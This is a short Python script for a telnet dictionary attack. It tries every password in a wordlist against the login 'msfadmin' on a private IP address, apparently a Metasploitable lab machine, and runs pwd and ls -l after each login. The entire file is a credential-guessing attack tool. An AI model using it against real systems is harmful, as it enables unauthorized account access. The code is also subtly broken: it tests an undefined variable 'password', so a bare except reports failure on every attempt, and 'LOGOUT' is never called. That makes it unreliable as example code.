#!/usr/bin/python3.7
import telnetlib
import time

target = "10.171.1.129"
username = "msfadmin"
#wordlist="wordlist.txt"
wordlist="wordlist.txt"
fail = '\033[91m[-]\033[0m'
ok  = '\033[92m[+]\033[0m'
msg_ok=" BINGO - Username: "
msg_fail=" FAIL - Username: "
msg_pass=" Password: "
msg_start="TELNET Dictnary Attack Started" 
msg_final="TELNET Dictnary Attack finished" 

print(msg_start)

with open(wordlist, "r") as _word:
    for _line in _word:
        _password = _line.strip("\n")
        
        try:
            telnetconn = telnetlib.Telnet(target)
            telnetconn.read_until(b"login: ")
            telnetconn.write(username.encode('ascii') + b"\n")
            
            if password:
                telnetconn.read_until(b"Password: ")
                telnetconn.write(_password.encode('ascii') + b"\n")

            telnetconn.write(b"pwd\n")
            telnetconn.write(b"ls -l \n")
            telnetconn.write(b"exit\n")

            print(telnetconn.read_all().decode('ascii'))
            telnetconn.LOGOUT

        except:
            print( fail + msg_fail + username + msg_pass + _password)
            #time.sleep(5)

print(msg_final)



